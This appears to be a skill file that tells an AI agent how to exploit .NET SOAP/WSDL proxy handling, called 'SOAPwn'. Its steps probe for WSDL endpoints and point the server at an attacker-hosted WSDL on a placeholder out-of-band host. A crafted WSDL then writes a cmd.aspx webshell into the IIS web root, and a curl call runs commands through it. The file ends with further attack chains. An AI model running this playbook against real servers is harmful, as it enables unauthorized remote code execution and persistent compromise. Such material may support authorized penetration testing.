---
name: soapwn-wsdl-rce
description: Exploit .NET WSDL proxy (HttpWebClientProtocol) to achieve arbitrary file write and RCE via SOAP service import -- a silent type cast failure during deserialization writes fetched content to disk as .aspx/.cshtml. Use when .NET SOAP/WCF/ASMX endpoints detected.
---

# SOAPwn -- .NET WSDL Proxy RCE

## Pattern
- .NET application consumes external SOAP services via WSDL import
- `HttpWebClientProtocol` or `SoapHttpClientProtocol` generates client proxy
- Application fetches WSDL from user-influenced URL

## Exploit Workflow

### 1. Detect SOAP/WCF endpoints
```bash
# Probe common SOAP endpoint patterns
curl -x localhost:8080 -k -sD- "https://target.com/Service.asmx?WSDL" | head -20
curl -x localhost:8080 -k -sD- "https://target.com/Service.svc?wsdl" | head -20
curl -x localhost:8080 -k -sD- "https://target.com/Service.asmx?disco" | head -20

# Check for .NET indicators in headers
curl -x localhost:8080 -k -sI "https://target.com/" | rg -i "x-powered-by|x-aspnet|server.*iis"
```

**Checkpoint:** Must see valid WSDL XML with `<wsdl:definitions>` and .NET response headers. If no WSDL endpoint found, this technique does not apply.

### 2. Find user-influenced WSDL URL parameter
```bash
# Via JSON API
curl -x localhost:8080 -k "https://target.com/api/import-service" \
  -H "Content-Type: application/json" \
  -d '{"wsdlUrl": "https://ATTACKER-OOB-SERVER/canary.wsdl"}'

# Via SOAP import header
curl -x localhost:8080 -k "https://target.com/Service.asmx" \
  -H "Content-Type: text/xml" \
  -d '<wsdl:import namespace="http://target.com/" location="https://ATTACKER-OOB-SERVER/canary.wsdl"/>'
```

**Checkpoint:** Check OOB callback -- did the server fetch your URL? If no callback, the WSDL URL is not user-influenced.

### 3. Test file:// protocol
```bash
curl -x localhost:8080 -k "https://target.com/api/import-service" \
  -H "Content-Type: application/json" \
  -d '{"wsdlUrl": "file:///C:/inetpub/wwwroot/test.txt"}'
```

### 4. Craft malicious WSDL and host on attacker server
```xml
<?xml version="1.0" encoding="utf-8"?>
<wsdl:definitions xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"
  xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/">
  <wsdl:types>
    <xsd:schema>
      <!-- Schema triggers code generation -- proxy class written to disk -->
    </xsd:schema>
  </wsdl:types>
  <wsdl:service name="Shell">
    <wsdl:port binding="tns:ShellBinding">
      <soap:address location="file:///C:/inetpub/wwwroot/cmd.aspx"/>
    </wsdl:port>
  </wsdl:service>
</wsdl:definitions>
```

### 5. Verify write and access webshell
```bash
curl -x localhost:8080 -k "https://target.com/cmd.aspx?cmd=whoami"
```

**Checkpoint:** If webshell is not accessible, the write may have landed in a non-web-accessible path. Try alternative paths: `C:\inetpub\wwwroot\`, `C:\wwwroot\`, or use error messages to discover the actual web root. If .aspx execution is blocked, chain with `write-path-to-rce`.

## Prerequisites
- Target runs .NET (IIS, ASP.NET)
- Application imports or consumes external SOAP/WSDL definitions
- User can influence the WSDL URL parameter
- `file://` protocol not blocked at network or application layer

## Chain With
- `write-path-to-rce` (if direct .aspx execution blocked, use framework view resolution)
- `ssrf-redirect-loop` (if WSDL URL fetched server-side, chain with redirect for internal access)
